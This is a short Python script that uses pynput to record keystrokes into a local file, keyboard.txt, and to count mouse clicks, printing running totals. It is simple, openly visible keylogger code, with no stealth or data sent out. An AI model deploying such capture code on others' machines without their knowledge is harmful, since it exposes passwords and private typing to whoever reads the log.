import pynput
from pynput.keyboard import Key,Listener
tmp = 0
keys = []
count = 0
mcount = 0
def on_press(key):
    global keys,count,tmp
    keys.append(key)
    tmp += 1
    count += 1
    print("Keyboard count is: ",count)
    if tmp >= 10:
        tmp = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("keyboard.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("enter") > 0:
                f.write('\n')
            elif k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)

def on_click(x,y,button,pressed):
    global mcount
    if pressed:
        mcount += 1
        print("Mouse count is: ",mcount)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press,on_release = on_release) as listener:
    with pynput.mouse.Listener(on_click=on_click) as listener1:
        listener1.join()
    listener.join()

    print("Total keyboard pressed: ",count)
    print("Total mouse clicked: ",mcount)

